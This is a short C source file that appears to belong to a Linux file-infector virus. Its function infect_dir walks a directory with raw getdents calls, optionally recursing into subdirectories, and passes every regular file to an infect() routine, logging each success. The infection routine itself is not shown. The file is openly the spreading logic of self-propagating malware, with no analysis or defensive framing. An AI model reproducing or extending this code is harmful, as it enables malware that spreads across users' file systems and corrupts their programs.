#include "infect.h"

int infect_dir(char *dirname, struct s_infect_params p, struct s_opt opt){
	//print("infecting directory:");
	//println(dirname);
	struct linux_dirent *d;
	char		buf[4096];
	int		fd;

	debug("infect.dir: ", dirname);
	if ((fd = ft_open(dirname, 65536, 0)) < 0) return fail("open dir");
	while (1)
	{
		int size = getdents(fd, buf, sizeof(buf));
		if (size == 0)
			break;
		if (size < 0)
		{
			ft_close(fd);
			return fail("read dir");
		}
		size_t x;
		for (x = 0; x < (size_t)size; x += d->d_reclen){
			d = (struct linux_dirent*)(buf + x);
			if (opt.do_recur && !str_equal(d->d_name, ".") && !str_equal(d->d_name, "..") &&  d_isdir(d)){
				char *t = ft_add_base(dirname, d->d_name);
				if (t == NULL)
					continue;
				infect_dir(t,p,opt);
				ft_free(t);
			}
			else if (d_isfile(d)){
				char *t = ft_add_base(dirname, d->d_name);
				debug("infect.file: ", t);
				if (t == NULL)
					continue;
				if (infect(t, t, p, opt)){
					debug("successfully infected");
				}
				ft_free(t);
			}
		}
	}
	ft_close(fd);
	return TRUE;
}
